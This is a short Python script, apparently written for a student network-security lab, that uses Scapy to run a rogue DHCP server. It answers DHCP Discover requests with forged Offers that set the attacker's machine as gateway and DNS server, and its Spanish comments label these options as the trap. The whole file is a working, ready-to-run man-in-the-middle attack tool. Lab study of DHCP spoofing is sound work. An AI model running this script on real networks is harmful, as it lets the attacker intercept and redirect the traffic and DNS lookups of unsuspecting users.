#!/usr/bin/env python3
# D31B1 DHCP Rogue Server
# Uso: sudo python3 d31b1_dhcp_rogue.py

from scapy.all import *

# --- TUS DATOS DE MATRÍCULA ---
MY_IP = "20.24.20.2"       # Tu Kali
FAKE_GATEWAY = "20.24.20.2"  # Tú (para interceptar tráfico)
FAKE_DNS = "20.24.20.2"      # Tú (para interceptar DNS)
SUBNET_MASK = "255.255.255.0"
TARGET_IFACE = "eth0"

def listen_dhcp():
    print(f"\n[*] SERVIDOR DHCP ROGUE ACTIVO EN {TARGET_IFACE}")
    print(f"[*] Entregando -> Gateway: {FAKE_GATEWAY} | DNS: {FAKE_DNS}")
    print("[*] Esperando peticiones 'DHCP Discover'...")

    # Filtramos paquetes UDP puerto 67 (Server) o 68 (Client)
    sniff(filter="udp and (port 67 or 68)", prn=handle_dhcp_packet, iface=TARGET_IFACE)

def handle_dhcp_packet(packet):
    # Si el paquete tiene capa DHCP y es tipo DISCOVER (1) o REQUEST (3)
    if DHCP in packet and packet[DHCP].options[0][1] == 1:
        print(f"\n[+] ¡Víctima detectada! MAC: {packet[Ether].src}")
        
        # IP que le vamos a regalar a la víctima
        # En un ataque real llevaríamos control, aquí damos una fija o aleatoria
        offered_ip = "20.24.20.100"

        # Construir respuesta (DHCP OFFER)
        eth = Ether(src=get_if_hwaddr(TARGET_IFACE), dst=packet[Ether].src)
        ip = IP(src=MY_IP, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(op=2, yiaddr=offered_ip, siaddr=MY_IP, giaddr=0, xid=packet[BOOTP].xid, chaddr=packet[BOOTP].chaddr)
        
        # EL VENENO ESTÁ AQUÍ EN LAS OPCIONES:
        dhcp_payload = DHCP(options=[
            ("message-type", "offer"),
            ("subnet_mask", SUBNET_MASK),
            ("router", FAKE_GATEWAY),    # <--- La trampa (Gateway falso)
            ("name_server", FAKE_DNS),   # <--- La trampa (DNS falso)
            ("lease_time", 86400),
            ("server_id", MY_IP),
            "end"
        ])
        
        packet_offer = eth / ip / udp / bootp / dhcp_payload
        
        print(f"[->] Enviando Configuración Maliciosa (Offer) a {offered_ip}...")
        sendp(packet_offer, iface=TARGET_IFACE, verbose=0)

if __name__ == "__main__":
    listen_dhcp()